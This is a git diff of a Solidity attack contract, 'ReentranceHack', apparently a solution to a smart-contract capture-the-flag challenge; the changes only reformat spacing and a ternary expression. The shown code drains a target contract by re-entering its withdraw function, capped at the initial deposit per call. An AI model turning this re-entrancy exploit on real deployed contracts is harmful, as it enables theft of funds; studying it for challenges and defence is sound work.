@@ -23,7 +23,7 @@ contract ReentranceHack {
 
         // first deposit some funds
         initialDeposit = msg.value;
-        challenge.donate{value: initialDeposit}(address(this));
+        challenge.donate{ value: initialDeposit }(address(this));
 
         // withdraw these funds over and over again because of re-entrancy issue
         callWithdraw();
@@ -43,9 +43,7 @@ contract ReentranceHack {
         if (keepRecursing) {
             // can only withdraw at most our initial balance per withdraw call
             uint256 toWithdraw =
-                initialDeposit < challengeTotalRemainingBalance
-                    ? initialDeposit
-                    : challengeTotalRemainingBalance;
+                initialDeposit < challengeTotalRemainingBalance ? initialDeposit : challengeTotalRemainingBalance;
             challenge.withdraw(toWithdraw);
         }
     }
